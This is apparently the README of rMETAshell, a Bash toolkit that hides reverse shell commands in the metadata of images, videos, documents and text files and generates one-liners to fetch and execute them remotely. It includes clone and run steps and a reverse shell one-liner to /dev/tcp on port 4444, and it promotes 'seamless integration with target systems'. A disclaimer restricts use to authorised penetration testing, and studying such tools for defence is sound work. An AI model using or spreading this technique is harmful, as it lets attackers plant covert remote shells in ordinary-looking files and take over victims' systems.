# rMETAshell - A Reverse Shell Metadata Injection and One-Liner Generation Toolkit
[![Sponsor](https://img.shields.io/badge/Sponsor-%E2%9D%A4-red)](https://github.com/sponsors/git5loxosec) [![Kali Linux Compatible](https://img.shields.io/badge/Kali%20Linux-Compatible-brightgreen)](https://www.kali.org/)
 <img src="https://camo.githubusercontent.com/f25217d6db3b6cb603d9fb4a2b017a682aae3b1ec5c6ffab653f6cd31eceb73c/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446576656c6f7065642532306f6e2d6b616c692532306c696e75782d626c756576696f6c6574"> 
 ![Language](https://img.shields.io/badge/Language-Bash-green.svg)
 ![License](https://img.shields.io/badge/License-MIT-blue.svg) 

<img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell1.png">
Clean image file no reverse shell.
<img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell2.png">
The reverse shell injection method used here wont affect the integrity of the image file.
<img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell3.png">
Connection established, mission accomplished!


# New!:

**New** one-liner execution methods!

**Supports** png, jpg, jpeg, jpe, jif, jfif, jfi, jp2, j2k, jpf, jpx, jp2a, j2c, tif, tiff, crw, cr2, dng, mrw, nef, pef, arw, rw2, sr2, srw, orf, png, gif, bmp, dib, ico, pgf, jp2, j2k, jpf, jpx, jp2a, j2c, avi, mov, qt, moov, f4v, mp4, m4a, m4b, m4p, m4v, mp4v, mqv, jp2, j2k, jpf, jpx, jp2a, j2c, mpg, mpeg, m2v, mpv, m2p, m1v, m1p, m4v, divx, xvid, txt, text, log, md, markdown, html, htm, xml, json, csv, tsv, sql, yml, yaml, ini, cfg, conf, properties, prop, props, bat, sh, bash, zsh, ps1, ps, py, python, rb, ruby, perl, pl, php, js, javascript, jsx, ts, typescript, java, c, cpp, h, cs, csharp, vb, vbnet, swift, kotlin, rust, go, groovy, scala, lua, r, sas, scss, sass, less, styl, sql, plsql, psql, tsql, vbs, vba, vbscript, powershell, ps1xml, psd1, psm1, tex, latex, ltx, bib, rtf, doc, docx, xls, xlsx, ppt, pptx and pdf injection!

# Description:

rMETAshell is a command-line tool for injecting a reverse shell command into the metadata and generating one-liner execution methods.

# How It Works:
rMETAshell takes a reverse shell command and an image, video or text file as input. It then injects the command into the file using metadata comments. After injection, it generates a one-liner execution method for retrieving and executing the injected command from a remote location.

# Features:
Metadata-Based Shell Injection: Inject reverse shell commands into image, video, and text file metadata, ensuring seamless integration with target systems.

One-Liner Generation: Automatically generate one-liners for quick and efficient remote shell access. Choose from a variety of execution methods tailored to different file formats.

Supported File Formats: rMETAshell supports the following file formats for shell injection and one-liner generation:

Image Formats: JPEG, PNG, BMP, and more.
Video Formats: MP4, AVI, MKV, and others.
Text Formats: TXT, CSV, XML, and more.

## Installation

1. Clone the repository:

   ```
   git clone https://github.com/git5loxosec/rMETAshell
   ```

2. Change to the project directory:

   ```
   cd rMETAshell
   ```

3. Make the script executable:

   ```
   chmod +x rMETAshell.sh
   ```

## Usage

```
./rMETAshell.sh [OPTIONS] <REVERSE_SHELL_COMMAND> <FILENAME>
```

- `[OPTIONS]` - Optional arguments.
- `<REVERSE_SHELL_COMMAND>` - The reverse shell command to inject.
- `<FILENAME>` - The name of the media file.

**Example:**

```
./rMETAshell.sh "/bin/sh -i >& /dev/tcp/192.168.1.128/4444 0>&1" image.jpg
```

Note: Ensure that you have the required dependencies (e.g., exiftool, curl) installed on your system before using rMETAshell.

**Warning: Ethical and Responsible Use Only
rMETAshell is intended for legitimate and ethical purposes, such as penetration testing, cybersecurity assessments, and educational use. Unauthorized use of this tool for malicious activities is strictly prohibited and may have serious legal consequences. Ensure that you have proper authorization and adhere to all applicable laws and regulations before using rIMGshell.**


## License


This project is licensed under the [AGPL-3.0 license](LICENSE).
